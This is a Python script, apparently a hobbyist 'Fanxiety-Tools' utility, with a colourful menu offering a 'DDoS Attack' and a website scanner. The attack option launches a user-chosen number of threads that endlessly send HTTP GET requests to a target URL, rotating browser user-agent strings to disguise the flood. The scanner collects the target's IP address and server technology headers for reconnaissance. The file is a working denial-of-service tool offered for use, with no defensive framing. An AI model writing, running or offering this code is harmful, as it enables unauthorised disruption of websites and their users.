import threading
import requests
import time
import random
import socket
from queue import Queue
from colorama import Fore, Style, init

init(autoreset=True)
lock = threading.Lock() 

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
]

def attack(target_url, delay):
    while True:
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            response = requests.get(target_url, headers=headers)
            with lock: 
             print(f"{Fore.GREEN}[✓] {Fore.WHITE}Request sent! {Fore.CYAN}Status: {Fore.YELLOW}{response.status_code}", flush=True)

        except Exception as e:
            print(f"{Fore.RED}[✗] {Fore.WHITE}Error: {Fore.YELLOW}{e}")
        time.sleep(delay)

def scan_website(url):
    try:
        domain = url.split("//")[-1].split("/")[0]
        ip_address = socket.gethostbyname(domain)

        response = requests.get(url)
        server_header = response.headers.get('Server', 'Not found')

        technologies = []
        if 'x-powered-by' in response.headers:
            technologies.append(response.headers['x-powered-by'])
        if 'x-generator' in response.headers:
            technologies.append(response.headers['x-generator'])

        print(f"\n{Fore.CYAN}╔{'═'*50}╗")
        print(f"{Fore.CYAN}║{Fore.CYAN}{'WEBSITE SCAN RESULTS':^50}{Fore.LIGHTBLUE_EX}║")
        print(f"{Fore.CYAN}╠{'═'*50}╣")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}URL: {Fore.RED}{url.ljust(44)}{Fore.LIGHTBLUE_EX}║")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}IP Address: {Fore.RED}{ip_address.ljust(37)}{Fore.LIGHTBLUE_EX}║")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}Server: {Fore.RED}{server_header.ljust(41)}{Fore.LIGHTBLUE_EX}║")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}Technology: {Fore.RED}{', '.join(technologies).ljust(37)}{Fore.LIGHTBLUE_EX}║")
        print(f"{Fore.CYAN}╚{'═'*50}╝")
    except Exception as e:
        print(f"{Fore.RED}[✗] {Fore.WHITE}Error while scanning: {Fore.YELLOW}{e}")

def print_banner():
    print(f"""{Fore.RED}
███████╗ █████╗ ███╗   ██╗██╗  ██╗██╗███████╗████████╗██╗   ██╗
██╔════╝██╔══██╗████╗  ██║╚██╗██╔╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
█████╗  ███████║██╔██╗ ██║ ╚███╔╝ ██║█████╗     ██║    ╚████╔╝ 
██╔══╝  ██╔══██║██║╚██╗██║ ██╔██╗ ██║██╔══╝     ██║     ╚██╔╝  
██║     ██║  ██║██║ ╚████║██╔╝ ██╗██║███████╗   ██║      ██║   
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝╚══════╝   ╚═╝      ╚═╝   
    {Fore.BLUE}Fanxiety-Tools v1.0{Style.RESET_ALL}
    """)

def print_menu():
    print(f"{Fore.CYAN}╔{'═'*50}╗")
    print(f"{Fore.CYAN}║{Fore.CYAN}{'MAIN MENU':^50}{Fore.LIGHTBLUE_EX}║")  
    print(f"{Fore.CYAN}╠{'═'*50}╣")
    print(f"{Fore.CYAN}║ {Fore.YELLOW}1.{Fore.RED} DDoS Attack{' '*35}{Fore.LIGHTBLUE_EX}║")  
    print(f"{Fore.CYAN}║ {Fore.YELLOW}2.{Fore.RED} Website Scanner{' '*31}{Fore.LIGHTBLUE_EX}║")  
    print(f"{Fore.CYAN}║ {Fore.YELLOW}3.{Fore.RED} Exit{' '*42}{Fore.LIGHTBLUE_EX}║")  
    print(f"{Fore.CYAN}╚{'═'*50}╝")

def fanxiety_tool():
    print_banner()
    print_menu()
    
    choice = input(f"\n{Fore.YELLOW}[?]{Fore.WHITE} Select options: ")
    
    if choice == "1":
        print(f"\n{Fore.CYAN}╔{'═'*50}╗")
        print(f"{Fore.CYAN}║{Fore.RED}{'ATTACK CONFIGURATION':^50}{Fore.LIGHTBLUE_EX}║")  
        print(f"{Fore.CYAN}╠{'═'*50}╣")

        thread_count = int(input(f"{Fore.CYAN}║ {Fore.WHITE}Number of Threads (example: 100): {Fore.LIGHTBLUE_EX}"))
        target_url = input(f"{Fore.CYAN}║ {Fore.WHITE}Target URL: {Fore.LIGHTBLUE_EX}")
        delay = float(input(f"{Fore.CYAN}║ {Fore.WHITE}Delay (second): {Fore.LIGHTBLUE_EX}"))
        print(f"{Fore.CYAN}╚{'═'*50}╝")


        
        print(f"\n{Fore.GREEN}[✓] {Fore.WHITE}Attack started! Press {Fore.RED}Ctrl + C {Fore.WHITE}to stop and return to menu...\n")
        
        for _ in range(thread_count):
            thread = threading.Thread(target=attack, args=(target_url, delay))
            thread.daemon = True
            thread.start()
        
        while True:
            time.sleep(1)
            
    
    elif choice == "2":
        target_url = input(f"\n{Fore.BLUE}║ {Fore.WHITE}Enter URL to scan: ")
        scan_website(target_url)

    elif choice == "":
        print(f"\n{Fore.RED}[!] {Fore.WHITE}Exit the program...")
        exit()

    
    else:
        print(f"\n{Fore.RED}[!] {Fore.WHITE}Invalid option!")

if __name__ == "__main__":
    try:
        fanxiety_tool()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] {Fore.WHITE}Attack stopped!")
        exit()
